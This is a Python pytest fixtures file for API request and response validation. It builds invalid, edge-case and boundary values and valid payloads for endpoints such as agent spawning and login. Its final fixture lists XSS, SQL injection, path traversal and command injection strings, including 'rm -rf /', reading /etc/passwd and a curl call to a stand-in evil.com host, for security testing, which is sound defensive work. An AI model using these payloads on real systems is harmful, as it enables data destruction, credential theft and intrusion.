"""
Validation-specific test fixtures for API testing.

Provides reusable fixtures for request validation, response validation,
and edge case testing across all API endpoints.
"""

import pytest
from pydantic import ValidationError, BaseModel
from typing import Dict, Any, List, Optional, Union
from datetime import datetime, timedelta
import json
import uuid


@pytest.fixture
def invalid_data_generator():
    """
    Generate various invalid inputs for testing request validation.

    Returns a function that accepts a data type and returns invalid values.
    """
    def _generate_invalid_values(data_type: str) -> List[Any]:
        if data_type == "string":
            return [
                None,  # null instead of string
                123,  # number instead of string
                "",  # empty string (edge case)
                "a" * 10000,  # very long string
                "<script>alert('xss')</script>",  # special characters
                "\x00\x01\x02",  # unicode edge cases
            ]
        elif data_type == "integer":
            return [
                None,  # null instead of int
                "not_a_number",  # string instead of int
                1.5,  # float instead of int
                -999999999999999999999,  # overflow
                999999999999999999999,  # overflow
            ]
        elif data_type == "float":
            return [
                None,  # null instead of float
                "not_a_number",  # string instead of float
                float('inf'),  # infinity
                float('nan'),  # NaN
            ]
        elif data_type == "boolean":
            return [
                None,  # null instead of bool
                "true",  # string instead of bool
                1,  # int instead of bool
                0,  # int instead of bool
            ]
        elif data_type == "datetime":
            return [
                None,  # null instead of datetime
                "not_a_date",  # invalid format
                123,  # int instead of datetime
                "2024-13-01T00:00:00Z",  # invalid month
                "2024-02-30T00:00:00Z",  # invalid day
            ]
        elif data_type == "email":
            return [
                None,  # null instead of email
                "not_an_email",  # missing @
                "@example.com",  # missing local part
                "user@",  # missing domain
                "user@@example.com",  # double @
                "user@example",  # invalid TLD
            ]
        elif data_type == "url":
            return [
                None,  # null instead of URL
                "not_a_url",  # missing protocol
                "http://",  # missing domain
                "://example.com",  # missing protocol
                "javascript:alert('xss')",  # dangerous protocol
            ]
        elif data_type == "uuid":
            return [
                None,  # null instead of UUID
                "not_a_uuid",  # invalid format
                "123e4567-e89b-12d3-a456-42661417400",  # too short
                "123e4567-e89b-12d3-a456-42661417400x",  # invalid character
            ]
        elif data_type == "enum":
            return [
                None,  # null instead of enum
                "INVALID_VALUE",  # not in enum
                123,  # wrong type
                "",  # empty string
            ]
        else:
            return [None, ""]  # Generic invalid values

    return _generate_invalid_values


@pytest.fixture
def valid_request_factory():
    """
    Generate valid request payloads for each endpoint.

    Returns a function that accepts an endpoint type and returns a valid payload.
    """
    def _create_valid_request(endpoint_type: str, **overrides) -> Dict[str, Any]:
        if endpoint_type == "spawn_agent":
            return {
                "name": "test_agent",
                "category": "testing",
                "module_path": "test.module",
                "maturity": "STUDENT",
                "confidence": 0.5,
                "description": "Test agent description",
                "config": {},
                **overrides
            }
        elif endpoint_type == "submit_canvas":
            return {
                "canvas_id": str(uuid.uuid4()),
                "form_data": {
                    "field1": "value1",
                    "field2": "value2"
                },
                "agent_id": str(uuid.uuid4()),
                "execution_id": str(uuid.uuid4()),
                **overrides
            }
        elif endpoint_type == "navigate_browser":
            return {
                "url": "https://example.com",
                "wait_for_selector": None,
                "timeout": 30000,
                **overrides
            }
        elif endpoint_type == "login":
            return {
                "email": "test@example.com",
                "password": "SecurePass123!",
                **overrides
            }
        elif endpoint_type == "register":
            return {
                "email": "test@example.com",
                "password": "SecurePass123!",
                "confirm_password": "SecurePass123!",
                "name": "Test User",
                **overrides
            }
        else:
            return {}

    return _create_valid_request


@pytest.fixture
def response_validator():
    """
    Validate response JSON against expected schema.

    Returns a function that checks response structure and types.
    """
    def _validate_response(response_data: Dict[str, Any], expected_fields: Dict[str, type]) -> bool:
        """
        Validate response against expected field types.

        Args:
            response_data: Actual response JSON
            expected_fields: Dict mapping field names to expected types

        Returns:
            True if validation passes, False otherwise
        """
        for field, expected_type in expected_fields.items():
            if field not in response_data:
                return False

            actual_value = response_data[field]

            # Handle nullable fields
            if actual_value is None:
                continue

            # Handle Optional types
            if hasattr(expected_type, "__origin__") and expected_type.__origin__ is Union:
                # Extract the actual type from Optional[type]
                args = expected_type.__args__
                if type(None) in args:
                    # It's Optional, so check the non-None type
                    non_none_type = [arg for arg in args if arg is not type(None)][0]
                    if not isinstance(actual_value, non_none_type):
                        return False
                continue

            # Basic type checking
            if not isinstance(actual_value, expected_type):
                return False

        return True

    return _validate_response


@pytest.fixture
def edge_case_values():
    """
    Provide edge case values for testing boundary conditions.

    Returns a dictionary of edge case values by data type.
    """
    now = datetime.utcnow()

    return {
        "integer": {
            "zero": 0,
            "negative": -1,
            "max_safe_int": 2**53 - 1,
            "min_safe_int": -(2**53 - 1),
            "one": 1,
        },
        "float": {
            "zero": 0.0,
            "negative": -0.001,
            "max_precision": 0.9999999999999999,
            "scientific_notation": 1.23e-10,
            "very_small": 1e-100,
        },
        "string": {
            "empty": "",
            "single_char": "a",
            "spaces": "     ",
            "unicode": "日本語 🎉",
            "emoji": "😀😃😄😁😆😅🤣😂🙂🙃😉😊😇🥰😍🤩😘",
            "max_length": "a" * 1000,
        },
        "datetime": {
            "epoch": datetime(1970, 1, 1),
            "now": now,
            "future": now + timedelta(days=365),
            "far_future": now + timedelta(days=36500),  # 100 years
            "past": now - timedelta(days=365),
            "far_past": now - timedelta(days=36500),
        },
        "boolean": {
            "true": True,
            "false": False,
        },
        "null": {
            "none": None,
            "null_json": json.dumps(None),
        },
        "list": {
            "empty": [],
            "single": [1],
            "large": list(range(1000)),
        },
        "dict": {
            "empty": {},
            "single": {"key": "value"},
            "nested": {"level1": {"level2": {"level3": "deep"}}},
        }
    }


@pytest.fixture
def validation_error_matcher():
    """
    Extract specific validation errors from Pydantic exceptions.

    Returns a function that formats validation errors for test assertions.
    """
    def _extract_validation_errors(error: ValidationError) -> Dict[str, List[str]]:
        """
        Extract validation errors from Pydantic ValidationError.

        Args:
            error: Pydantic ValidationError exception

        Returns:
            Dict mapping field names to list of error messages
        """
        errors_by_field = {}

        for error_item in error.errors():
            # Get field location (e.g., ["name"] or ["form_data", "field1"])
            loc = error_item["loc"]
            field_name = ".".join(str(l) for l in loc) if loc else "root"

            # Get error message
            message = error_item["msg"]
            error_type = error_item["type"]

            # Format error message
            formatted_message = f"{error_type}: {message}"

            # Add to errors by field
            if field_name not in errors_by_field:
                errors_by_field[field_name] = []
            errors_by_field[field_name].append(formatted_message)

        return errors_by_field

    return _extract_validation_errors


@pytest.fixture
def boundary_values():
    """
    Provide boundary values for testing min/max constraints.

    Returns boundary values for common constraint ranges.
    """
    return {
        "confidence": {
            "min": 0.0,
            "max": 1.0,
            "below_min": -0.1,
            "above_max": 1.1,
            "near_min": 0.001,
            "near_max": 0.999,
        },
        "timeout": {
            "min": 0,
            "max": 300000,
            "below_min": -1,
            "above_max": 300001,
        },
        "page_size": {
            "min": 1,
            "max": 100,
            "below_min": 0,
            "above_max": 101,
        },
        "string_length": {
            "min_10": "a" * 10,
            "max_100": "a" * 100,
            "below_min_10": "a" * 9,
            "above_max_100": "a" * 101,
        }
    }


@pytest.fixture
def malicious_inputs():
    """
    Provide malicious inputs for security testing.

    Returns common attack patterns to test validation security.
    """
    return {
        "xss": [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
        ],
        "sql_injection": [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl http://evil.com)",
        ]
    }
